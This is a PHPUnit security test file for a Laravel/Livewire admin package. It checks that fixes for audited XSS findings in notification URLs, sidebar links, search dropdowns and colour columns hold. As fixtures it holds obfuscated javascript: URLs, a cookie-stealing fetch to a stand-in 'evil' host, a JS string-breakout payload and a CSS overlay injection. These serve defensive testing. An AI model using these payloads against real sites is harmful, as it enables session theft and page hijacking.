<?php

declare(strict_types=1);

namespace Ptah\Tests\Feature\Security;

use Illuminate\Database\Eloquent\Model;
use Illuminate\Database\Schema\Blueprint;
use Illuminate\Support\Facades\Blade;
use Illuminate\Support\Facades\Schema;
use Livewire\Livewire;
use PHPUnit\Framework\Attributes\Test;
use Ptah\Livewire\BaseCrud\BaseCrud;
use Ptah\Models\CrudConfig;
use Ptah\Services\Notification\NotificationService;
use Ptah\Support\MenuResolver;
use Ptah\Tests\TestCase;

/**
 * The XSS/link findings of the 28/09/2026 surface audit, fixed in 1.41.9.
 */
class AuditXssFindingsTest extends TestCase
{
    #[Test]
    public function notification_urls_are_read_the_way_the_browser_reads_them(): void
    {
        // A regex antiga (^\s*javascript:) deixava passar os dois primeiros.
        $this->assertNull(NotificationService::safeUrl("java\tscript:alert(1)"));
        $this->assertNull(NotificationService::safeUrl("\x01javascript:alert(1)"));
        $this->assertNull(NotificationService::safeUrl('JavaScript:alert(1)'));
        $this->assertSame('/pedidos/5', NotificationService::safeUrl('/pedidos/5'));
    }

    #[Test]
    public function the_sidebar_never_renders_a_script_url_for_a_child_or_the_quick_jump(): void
    {
        $items = [[
            'label' => 'Grupo', 'type' => 'menuGroup', 'icon' => 'bx bx-folder',
            'children' => [
                ['label' => 'Ruim', 'url' => "java\tscript:fetch('//evil/'+document.cookie)", 'type' => 'menuLink'],
                ['label' => 'Boa', 'url' => '/pedidos', 'type' => 'menuLink'],
            ],
        ]];

        $urls = array_column(MenuResolver::flatLinks($items), 'url', 'label');
        $this->assertStringNotContainsStringIgnoringCase('script', (string) ($urls['Ruim'] ?? ''), 'A busca rapida faz window.location.href = url.');
        $this->assertSame('/pedidos', $urls['Boa'] ?? null);

        $html = Blade::render('<x-forge-sidebar :items="$items" />', ['items' => $items]);
        $this->assertStringNotContainsStringIgnoringCase("href=\"java\tscript", $html);
        $this->assertStringContainsString('href="/pedidos"', $html);
    }

    #[Test]
    public function a_searchdropdown_value_with_quotes_cannot_break_out_of_the_js_string(): void
    {
        Schema::create('xss_codes', function (Blueprint $t) {
            $t->id();
            $t->string('code');
            $t->string('name');
        });
        XssCode::create(['code' => "x',''.constructor.constructor('alert(1)')(),'", 'name' => 'Parafuso']);

        CrudConfig::updateOrCreate(['model' => XssItem::class, 'route' => ''], ['config' => [
            'crud' => XssItem::class,
            'cols' => [['colsNomeFisico' => 'status', 'colsNomeLogico' => 'Código', 'colsTipo' => 'searchdropdown', 'colsGravar' => true,
                'colsSDModel' => XssCode::class, 'colsSDLabel' => 'name', 'colsSDValor' => 'code']],
            'permissions' => [],
        ]]);

        $html = Livewire::test(BaseCrud::class, ['model' => XssItem::class])
            ->call('openCreate')->call('searchDropdown', 'status', 'para')->html();

        $this->assertStringContainsString('Parafuso', $html, 'O dropdown nao listou a opcao — o teste nao olharia nada.');
        $this->assertStringNotContainsString("x',''.constructor", html_entity_decode($html, ENT_QUOTES));
    }

    #[Test]
    public function a_colour_column_cannot_declare_css(): void
    {
        CrudConfig::updateOrCreate(['model' => XssItem::class, 'route' => ''], ['config' => [
            'crud' => XssItem::class,
            'cols' => [['colsNomeFisico' => 'name', 'colsNomeLogico' => 'Cor', 'colsTipo' => 'text', 'colsRenderer' => 'color']],
            'permissions' => [],
        ]]);
        XssItem::create(['name' => '#000;position:fixed;inset:0;z-index:99999;background:url(https://evil/p.png)']);
        XssItem::create(['name' => '#3b82f6']);

        $html = Livewire::test(BaseCrud::class, ['model' => XssItem::class])->html();

        $this->assertStringNotContainsString('background:#000;position:fixed', $html);
        $this->assertStringContainsString('background:#3b82f6', $html);
    }
}

class XssCode extends Model
{
    protected $table = 'xss_codes';

    protected $fillable = ['code', 'name'];

    public $timestamps = false;
}

class XssItem extends Model
{
    protected $table = 'items';

    protected $fillable = ['name', 'status'];
}
